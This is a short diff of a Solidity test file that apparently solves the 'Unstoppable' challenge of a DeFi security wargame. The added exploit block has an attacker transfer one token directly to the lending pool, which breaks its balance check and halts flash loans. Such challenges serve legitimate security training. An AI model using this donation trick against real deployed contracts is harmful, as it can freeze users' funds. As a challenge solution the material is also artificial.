@@ -51,7 +51,7 @@ contract Unstoppable is Test {
             address(unstoppableLender)
         );
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
-        receiverUnstoppable.executeFlashLoan(10);
+        receiverUnstoppable.executeFlashLoan(INITIAL_ATTACKER_TOKEN_BALANCE);
         vm.stopPrank();
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
@@ -60,6 +60,11 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        //Sending tokens to unstoppableLender to trigger poolBalance != balanceBefore while executeFlashLoan
+        dvt.transfer(address(unstoppableLender), 1);
+        vm.stopPrank();
+       
         /**
          * EXPLOIT END *
          */
